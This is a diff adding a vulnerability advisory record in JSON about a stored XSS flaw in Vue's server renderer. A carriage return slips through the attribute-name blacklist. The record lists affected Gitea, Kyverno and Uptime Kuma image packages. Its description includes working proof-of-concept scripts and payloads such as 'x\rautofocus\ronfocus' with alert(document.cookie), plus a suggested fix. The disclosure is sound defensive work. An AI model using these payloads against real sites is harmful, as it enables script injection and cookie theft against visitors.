@@ -1,0 +1,426 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-4hp3-k4h3-jsr6-5mex",
+  "modified": "2026-11-13T16:59:06Z",
+  "published": "2026-11-13T16:59:06Z",
+  "upstream": [
+    "GHSA-g2v6-rqmx-r4w6"
+  ],
+  "summary": "## Description",
+  "details": "## Description\n\n`@vue/server-renderer` was investigated specifically because it's the one place in Vue where template rendering output becomes a real HTTP response body -- a genuine server-side trust boundary, unlike client-side rendering which only ever affects the same browser session that's already running the app's own JS.\n\n`ssrRenderAttrs()` (in `packages/server-renderer/src/helpers/ssrRenderAttrs.ts`) is what compiled SSR output calls for something like `<div v-bind=\"userObject\">`. It loops over the object's own keys and, for each one, renders it as an HTML attribute:\n\n```ts\nexport function ssrRenderDynamicAttr(\n  key: string,\n  value: unknown,\n  tag?: string,\n): string {\n  if (!isRenderableAttrValue(value)) {\n    return ``\n  }\n  const attrKey = ...\n  if (isBooleanAttr(attrKey) || ...) {\n    return includeBooleanAttr(value) ? ` ${attrKey}` : ``\n  } else if (isSSRSafeAttrName(attrKey)) {\n    return value === '' ? ` ${attrKey}` : ` ${attrKey}=\"${escapeHtml(value)}\"`\n  } else {\n    console.warn(`[@vue/server-renderer] Skipped rendering unsafe attribute name: ${attrKey}`)\n    return ``\n  }\n}\n```\n\nThe value always goes through `escapeHtml()` -- that part is correctly and consistently applied everywhere in this file. But the attribute name (`attrKey`) is only checked against a character blacklist, then spliced directly into the output with no escaping of its own:\n\n```ts\n// packages/shared/src/domAttrConfig.ts\nconst unsafeAttrCharRE = /[>/=\"'\\u0009\\u000a\\u000c\\u0020]/\n\nexport function isSSRSafeAttrName(name: string): boolean {\n  if (attrValidationCache.hasOwnProperty(name)) {\n    return attrValidationCache[name]\n  }\n  const isUnsafe = unsafeAttrCharRE.test(name)\n  if (isUnsafe) {\n    console.error(`unsafe attribute name: ${name}`)\n  }\n  return (attrValidationCache[name] = !isUnsafe)\n}\n```\n\nThat blacklist covers: `>`, `/`, `=`, `\"`, apostrophe, tab (U+0009), line feed (U+000A), form feed (U+000C), and space (U+0020). It does not cover U+000D -- carriage return (CR, written as `\\r` in JS).\n\nThat matters because of how browsers actually parse HTML. Per the WHATWG HTML parsing spec, the very first step (\"preprocessing the input stream\") converts every `\\r` not followed by `\\n` into a `\\n` before the tokenizer even starts. So a raw `\\r` sitting inside what Vue intends as a single attribute name gets turned into a real line feed by the browser -- and a line feed is one of the characters that terminates an attribute name and starts a new one. The blacklist checks the string as Vue sees it before the browser gets to reinterpret it, and that's exactly the gap.\n\nBelow is a fresh clone of this repo, confirming the exact commit, the exact vulnerable line, and zero modification to the source:\n\n<img width=\"781\" height=\"336\" alt=\"poc1\" src=\"https://github.com/user-attachments/assets/f4b92955-9a8f-4700-8c51-38ee46912de8\" />\n\n## Prrof\n\nThe real, unmodified  ssrRenderAttrs()  from the published  @vue/server-renderer@3.5.41  package was tested. The source at HEAD and the upcoming  v3.6.0-rc.2  tag were also checked, and the same vulnerable regular expression was present in both; no branch containing a fix was identified.\n\nFull script, saved as `poc.mjs` (GitHub doesn't let me attach `.mjs` directly, so the complete file is here):\n\n```js\nimport { ssrRenderAttrs } from '@vue/server-renderer';\nimport { parseFragment } from 'parse5';\n\n// This is exactly what compiled SSR output calls for `<div v-bind=\"userObject\">`\n// -- the real, unmodified, published ssrRenderAttrs function.\n// Full attack chain: the key itself contains ONLY letters, digits, and a\n// bare \\r (carriage return) -- no '>', '/', '=', '\"', \"'\", tab, LF, FF, or\n// space anywhere, so isSSRSafeAttrName() considers it fully safe. The value\n// is attacker-controlled JavaScript, delivered as the genuine value of the\n// LAST \\r-separated fragment, which Vue's own template naturally appends via\n// `=\"${escapeHtml(value)}\"` immediately after the key.\nconst maliciousKey = 'x\\rautofocus\\ronfocus';\nconst props = {\n  [maliciousKey]: 'alert(document.cookie)',\n};\n\nconst rawAttrString = ssrRenderAttrs(props);\nconsole.log('=== Raw string produced by the real ssrRenderAttrs() ===');\nconsole.log(JSON.stringify(rawAttrString));\nconsole.log();\nconsole.log('=== As it would literally appear in the HTML response ===');\nconsole.log(rawAttrString.replace(/\\r/g, '\\\\r').replace(/\\n/g, '\\\\n\\n'));\n\nconst fullHtml = `<div${rawAttrString}>content</div>`;\nconsole.log();\nconsole.log('=== Full element HTML ===');\nconsole.log(JSON.stringify(fullHtml));\n\n// Now parse this EXACT output with parse5 -- a real, spec-compliant HTML5\n// parser (the same parsing algorithm real browsers implement, including the\n// \\r\\n -> \\n input-preprocessing normalization step).\nconst fragment = parseFragment(fullHtml);\nconst div = fragment.childNodes.find(n => n.tagName === 'div');\nconsole.log();\nconsole.log('=== How a real HTML5 parser (parse5) actually interprets this ===');\nconsole.log('Attributes parsed on the <div>:');\nfor (const attr of div.attrs) {\n  console.log(`  ${JSON.stringify(attr.name)} = ${JSON.stringify(attr.value)}`);\n}\n\nconst injectedHandler = div.attrs.find(a => a.name === 'onfocus');\nconst injectedAutofocus = div.attrs.find(a => a.name === 'autofocus');\nconsole.log();\nif (injectedHandler && injectedAutofocus) {\n  console.log('*** CONFIRMED: real, separate \"autofocus\" and \"onfocus\" attributes were parsed out ***');\n  console.log(`*** onfocus value: ${JSON.stringify(injectedHandler.value)} ***`);\n  console.log('*** This element will execute the attacker JS automatically on page load, no user interaction needed. ***');\n} else {\n  console.log('Not confirmed.');\n}\n```\n\nThis is a fresh `npm install vue@3.5.41 @vue/server-renderer@3.5.41 parse5` -- the real, currently-published packages, not anything modified:\n\n<img width=\"831\" height=\"531\" alt=\"poc2\" src=\"https://github.com/user-attachments/assets/ea350948-4c93-45a3-b21a-f21dc7f90d29\" />\n\nReal, captured output:\n\n```\n=== Raw string produced by the real ssrRenderAttrs() ===\n\" x\\rautofocus\\ronfocus=\\\"alert(document.cookie)\\\"\"\n\n=== Full element HTML ===\n\"<div x\\rautofocus\\ronfocus=\\\"alert(document.cookie)\\\">content</div>\"\n\n=== How a real HTML5 parser (parse5) actually interprets this ===\nAttributes parsed on the <div>:\n  \"x\" = \"\"\n  \"autofocus\" = \"\"\n  \"onfocus\" = \"alert(document.cookie)\"\n\n*** CONFIRMED: real, separate \"autofocus\" and \"onfocus\" attributes were parsed out ***\n*** onfocus value: \"alert(document.cookie)\" ***\n```\n\n<img width=\"834\" height=\"897\" alt=\"poc3\" src=\"https://github.com/user-attachments/assets/a92f9c5b-e30d-4968-9ec1-8969628c6437\" />\n<img width=\"834\" height=\"896\" alt=\"poc4\" src=\"https://github.com/user-attachments/assets/a397cd3f-8eb3-49af-9604-a31a8bcdb2ea\" />\n\nThe single attribute name Vue intended to render safely -- `x\\rautofocus\\ronfocus` -- gets parsed by any real browser as three separate things: an empty `x` attribute, a real `autofocus` boolean attribute, and a real `onfocus=\"alert(document.cookie)\"` event handler. `autofocus` means the element receives focus automatically on page load, which fires the `focus` event immediately, which runs the injected JavaScript -- no click, no hover, no user interaction of any kind required.\n\nThis behavior was confirmed not to be specific to the payload by first isolating the mechanism with a minimal case (`\"foo\\rbar\"` as the key, no other special characters at all), which parse5 also split into two genuine separate attributes (`foo=\"\"` and `bar=\"...\"`), before building the full self-triggering payload above.\n\nTo go beyond the parser-level proof, there is a second script that calls the real `ssrRenderAttrs()`, captures its exact return value programmatically, and writes that unmodified byte sequence directly into an HTML file on disk -- no HTML was hand-typed anywhere in this step. Full script, saved as `generate_real_poc.mjs`:\n\n```js\nimport { ssrRenderAttrs } from '@vue/server-renderer';\nimport fs from 'fs';\n\n// This is the ACTUAL, unmodified ssrRenderAttrs() from the real, installed\n// @vue/server-renderer@3.5.41 -- nothing hand-typed below this line is HTML,\n// it is Vue's own function's real return value, captured programmatically.\nconst maliciousKey = 'x\\rsrc\\ronerror';\nconst props = { [maliciousKey]: 'alert(\"REAL Vue SSR output executed this -- cookie: \" + document.cookie)' };\n\nconst vueOutput = ssrRenderAttrs(props);\n\nconsole.log('=== Vue\\'s real ssrRenderAttrs() returned exactly this string ===');\nconsole.log(JSON.stringify(vueOutput));\n\n// Build the full page around Vue's UNMODIFIED output -- the <img ...> tag\n// content between the angle brackets is copied byte-for-byte from vueOutput,\n// not retyped.\nconst html = `<!DOCTYPE html>\n<html>\n<head><title>Vue SSR PoC -- byte-for-byte Vue output</title></head>\n<body>\n<h3>Everything inside the &lt;img&gt; tag below was written to this file\nprogrammatically from the real return value of <code>ssrRenderAttrs()</code>\nin the actual installed <code>@vue/server-renderer@3.5.41</code> package.\nNo HTML was hand-typed for the tag itself.</h3>\n<p>Exact JSON-escaped string Vue's function returned (see generate_real_poc.mjs, run right before this file was written):</p>\n<pre id=\"vue-output-proof\">${vueOutput.replace(/</g, '&lt;')}</pre>\n<hr>\n<img${vueOutput}>\n</body>\n</html>\n`;\n\nconst outPath = '/Users/onevilx/Desktop/vue-ssr-xss-poc-real.html';\nfs.writeFileSync(outPath, html);\nconsole.log('\\nWrote', outPath);\nconsole.log('Bytes inside the <img...> tag are Vue\\'s real, unmodified return value.');\n```\n\nOpening that generated file in a real browser fires the payload automatically:\n\n<img width=\"1666\" height=\"449\" alt=\"poc5\" src=\"https://github.com/user-attachments/assets/251bd830-634f-4cd0-bf79-849bbc07ec9a\" />\n\nDev tools on that same page confirm the browser genuinely parsed three separate attributes (`x`, `src`, `onerror`), matching the on-page proof text that was written directly from Vue's real return value:\n\n<img width=\"1348\" height=\"400\" alt=\"poc6\" src=\"https://github.com/user-attachments/assets/b19d6ff0-ecaa-45f3-9149-9f3d0d4faacb\" />\n\nWhether this affects client-side (non-SSR) Vue rendering was also checked: it doesn't, and I want to be upfront about that limit too. Client-side Vue sets dynamic attributes via the DOM `setAttribute()` API, which validates the name against the HTML QName grammar and throws a `DOMException` for characters like `\"` (I found an existing, unrelated open issue -- #13944 -- that confirms this behavior). That's a fundamentally different code path with its own validation, and I have not found a way to reach this specific bug through it. This is specifically and only an `@vue/server-renderer` (SSR) issue.\n\n## Impact\n\nThis requires an application to bind an object whose keys (not just values) come from a source the developer doesn't fully control, via `v-bind=\"object\"` or the equivalent compiled form. I want to be honest about how common that is: binding untrusted values into attributes is the standard, everyday Vue pattern that's already safely handled by `escapeHtml()`. Binding untrusted keys is less universal, but it's a real, documented, supported Vue feature, not a misuse of the framework -- and it's exactly the scenario `isSSRSafeAttrName()` exists to defend, which tells me it's already inside your own threat model for this file, just not fully closed. Realistic examples: a CMS or form-builder feature where field/attribute names are configurable by a less-trusted role and gets rendered via SSR to other users; a component that spreads a validated-elsewhere config object onto a root element; any dynamic-attributes helper that takes a plain object where both keys and values may originate from external data (a database record, an API response, a query string parsed into an object).\n\nWhere it's reachable, the impact is a complete, self-triggering stored XSS in server-rendered HTML -- the injected `autofocus`/`onfocus` payload runs the moment the page loads, for every visitor who receives that server-rendered output, with no interaction needed. That's a real trust-boundary break in a security-relevant helper whose entire job is making data safe to render.\n\n## Suggested fix\n\nAdd U+000D (carriage return) to `unsafeAttrCharRE` in `packages/shared/src/domAttrConfig.ts`:\n\n```ts\nconst unsafeAttrCharRE = /[>/=\"'\\u0009\\u000a\\u000c\\u000d\\u0020]/\n```\n\nDouble-checking against the full WHATWG \"ASCII whitespace\" definition (tab, LF, FF, CR, space -- all five) rather than enumerating characters one at a time would help, since that's exactly the kind of list that's easy to leave a gap in, which is what happened here.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "gitea-dev",
+        "purl": "pkg:apk/dhi/gitea-dev"
+      },
+      "versions": [
+        "1.26.4-r1",
+        "1.27.0-r1",
+        "1.27.0-r2",
+        "1.27.1-r0",
+        "1.27.1-r1",
+        "1.27.1-r2",
+        "1.27.1-r3",
+        "1.27.2-r0",
+        "1.27.2-r1",
+        "1.27.2-r2",
+        "1.27.2-r3",
+        "1.27.2-r4",
+        "1.27.3-r0",
+        "1.27.3-r1",
+        "1.27.3-r10",
+        "1.27.3-r11",
+        "1.27.3-r12",
+        "1.27.3-r13",
+        "1.27.3-r14",
+        "1.27.3-r15",
+        "1.27.3-r16",
+        "1.27.3-r17",
+        "1.27.3-r18",
+        "1.27.3-r19",
+        "1.27.3-r2",
+        "1.27.3-r20",
+        "1.27.3-r3",
+        "1.27.3-r4",
+        "1.27.3-r5",
+        "1.27.3-r7",
+        "1.27.3-r8",
+        "1.27.3-r9",
+        "28.3.0-r0",
+        "28.3.0-r1",
+        "28.3.0-r2",
+        "28.3.0-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "gitea-fips-dev",
+        "purl": "pkg:apk/dhi/gitea-fips-dev"
+      },
+      "versions": [
+        "1.26.4-r1",
+        "1.27.0-r1",
+        "1.27.0-r2",
+        "1.27.1-r0",
+        "1.27.1-r1",
+        "1.27.1-r2",
+        "1.27.1-r3",
+        "1.27.2-r0",
+        "1.27.2-r1",
+        "1.27.2-r2",
+        "1.27.2-r3",
+        "1.27.2-r4",
+        "1.27.3-r0",
+        "1.27.3-r1",
+        "1.27.3-r10",
+        "1.27.3-r11",
+        "1.27.3-r12",
+        "1.27.3-r13",
+        "1.27.3-r14",
+        "1.27.3-r15",
+        "1.27.3-r16",
+        "1.27.3-r17",
+        "1.27.3-r18",
+        "1.27.3-r19",
+        "1.27.3-r2",
+        "1.27.3-r20",
+        "1.27.3-r3",
+        "1.27.3-r4",
+        "1.27.3-r5",
+        "1.27.3-r7",
+        "1.27.3-r8",
+        "1.27.3-r9",
+        "28.3.0-r0",
+        "28.3.0-r1",
+        "28.3.0-r2",
+        "28.3.0-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "gitea-fips",
+        "purl": "pkg:apk/dhi/gitea-fips"
+      },
+      "versions": [
+        "1.26.4-r1",
+        "1.27.0-r1",
+        "1.27.0-r2",
+        "1.27.1-r0",
+        "1.27.1-r1",
+        "1.27.1-r2",
+        "1.27.1-r3",
+        "1.27.2-r0",
+        "1.27.2-r1",
+        "1.27.2-r2",
+        "1.27.2-r3",
+        "1.27.2-r4",
+        "1.27.3-r0",
+        "1.27.3-r1",
+        "1.27.3-r10",
+        "1.27.3-r11",
+        "1.27.3-r12",
+        "1.27.3-r13",
+        "1.27.3-r14",
+        "1.27.3-r15",
+        "1.27.3-r16",
+        "1.27.3-r17",
+        "1.27.3-r18",
+        "1.27.3-r19",
+        "1.27.3-r2",
+        "1.27.3-r20",
+        "1.27.3-r3",
+        "1.27.3-r4",
+        "1.27.3-r5",
+        "1.27.3-r7",
+        "1.27.3-r8",
+        "1.27.3-r9",
+        "28.3.0-r0",
+        "28.3.0-r1",
+        "28.3.0-r2",
+        "28.3.0-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "gitea",
+        "purl": "pkg:apk/dhi/gitea"
+      },
+      "versions": [
+        "1.26.4-r1",
+        "1.27.0-r1",
+        "1.27.0-r2",
+        "1.27.1-r0",
+        "1.27.1-r1",
+        "1.27.1-r2",
+        "1.27.1-r3",
+        "1.27.2-r0",
+        "1.27.2-r1",
+        "1.27.2-r2",
+        "1.27.2-r3",
+        "1.27.2-r4",
+        "1.27.3-r0",
+        "1.27.3-r1",
+        "1.27.3-r10",
+        "1.27.3-r11",
+        "1.27.3-r12",
+        "1.27.3-r13",
+        "1.27.3-r14",
+        "1.27.3-r15",
+        "1.27.3-r16",
+        "1.27.3-r17",
+        "1.27.3-r18",
+        "1.27.3-r19",
+        "1.27.3-r2",
+        "1.27.3-r20",
+        "1.27.3-r3",
+        "1.27.3-r4",
+        "1.27.3-r5",
+        "1.27.3-r7",
+        "1.27.3-r8",
+        "1.27.3-r9",
+        "28.3.0-r0",
+        "28.3.0-r1",
+        "28.3.0-r2",
+        "28.3.0-r3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "kyverno-policy-reporter-ui-dev",
+        "purl": "pkg:apk/dhi/kyverno-policy-reporter-ui-dev"
+      },
+      "versions": [
+        "2.6.1-r0",
+        "2.7.0-r0",
+        "2.7.0-r1",
+        "2.7.0-r2",
+        "2.7.1-r0",
+        "2.7.1-r1",
+        "2.7.1-r2",
+        "2.7.2-r0",
+        "2.7.2-r1",
+        "2.7.3-r0",
+        "2.8.1-r0",
+        "2.8.1-r1",
+        "2.8.1-r2",
+        "2.8.1-r3",
+        "2.8.1-r4",
+        "2.8.1-r5",
+        "2.9.0-r1",
+        "2.9.1-r0",
+        "2.9.1-r1",
+        "2.9.1-r2",
+        "2.9.1-r3",
+        "2.9.1-r4"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "kyverno-policy-reporter-ui-fips-dev",
+        "purl": "pkg:apk/dhi/kyverno-policy-reporter-ui-fips-dev"
+      },
+      "versions": [
+        "2.6.1-r0",
+        "2.7.0-r0",
+        "2.7.0-r1",
+        "2.7.0-r2",
+        "2.7.1-r0",
+        "2.7.1-r1",
+        "2.7.1-r2",
+        "2.7.2-r0",
+        "2.7.2-r1",
+        "2.7.3-r0",
+        "2.8.1-r0",
+        "2.8.1-r1",
+        "2.8.1-r2",
+        "2.8.1-r3",
+        "2.8.1-r4",
+        "2.8.1-r5",
+        "2.9.0-r1",
+        "2.9.1-r0",
+        "2.9.1-r1",
+        "2.9.1-r2",
+        "2.9.1-r3",
+        "2.9.1-r4"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "kyverno-policy-reporter-ui-fips",
+        "purl": "pkg:apk/dhi/kyverno-policy-reporter-ui-fips"
+      },
+      "versions": [
+        "2.6.1-r0",
+        "2.7.0-r0",
+        "2.7.0-r1",
+        "2.7.0-r2",
+        "2.7.1-r0",
+        "2.7.1-r1",
+        "2.7.1-r2",
+        "2.7.2-r0",
+        "2.7.2-r1",
+        "2.7.3-r0",
+        "2.8.1-r0",
+        "2.8.1-r1",
+        "2.8.1-r2",
+        "2.8.1-r3",
+        "2.8.1-r4",
+        "2.8.1-r5",
+        "2.9.0-r1",
+        "2.9.1-r0",
+        "2.9.1-r1",
+        "2.9.1-r2",
+        "2.9.1-r3",
+        "2.9.1-r4"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Alpine:3.24",
+        "name": "kyverno-policy-reporter-ui",
+        "purl": "pkg:apk/dhi/kyverno-policy-reporter-ui"
+      },
+      "versions": [
+        "2.6.1-r0",
+        "2.7.0-r0",
+        "2.7.0-r1",
+        "2.7.0-r2",
+        "2.7.1-r0",
+        "2.7.1-r1",
+        "2.7.1-r2",
+        "2.7.2-r0",
+        "2.7.2-r1",
+        "2.7.3-r0",
+        "2.8.1-r0",
+        "2.8.1-r1",
+        "2.8.1-r2",
+        "2.8.1-r3",
+        "2.8.1-r4",
+        "2.8.1-r5",
+        "2.9.0-r1",
+        "2.9.1-r0",
+        "2.9.1-r1",
+        "2.9.1-r2",
+        "2.9.1-r3",
+        "2.9.1-r4"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "uptime-kuma-1",
+        "purl": "pkg:deb/dhi/uptime-kuma-1"
+      },
+      "versions": [
+        "1.23.17-0",
+        "1.23.17-1",
+        "1.23.17-2",
+        "1.23.17-3",
+        "1.23.17-4",
+        "1.23.17-5",
+        "1.23.17-6",
+        "1.23.17-7",
+        "1.23.17-8",
+        "1.23.17-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "uptime-kuma-2",
+        "purl": "pkg:deb/dhi/uptime-kuma-2"
+      },
+      "versions": [
+        "2.5.0-0",
+        "2.5.0-1",
+        "2.5.0-2",
+        "2.5.10-0",
+        "2.5.11-0",
+        "2.5.3-0",
+        "2.5.3-1",
+        "2.5.4-0",
+        "2.5.5-0",
+        "2.5.5-1",
+        "2.5.6-0",
+        "2.5.7-0",
+        "2.5.7-1",
+        "2.5.9-0",
+        "2.5.9-1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-4hp3-k4h3-jsr6-5mex"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-g2v6-rqmx-r4w6"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/vuejs/core/security/advisories/GHSA-g2v6-rqmx-r4w6"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/vuejs/core/pull/15266"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/vuejs/core/commit/a2b40db9a83b36ed9da3a16403cf8f040262d73f"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/vuejs/core/releases/tag/v3.6.0-rc.6"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/vuejs/core/releases/tag/v3.5.42"
+    }
+  ]
+}
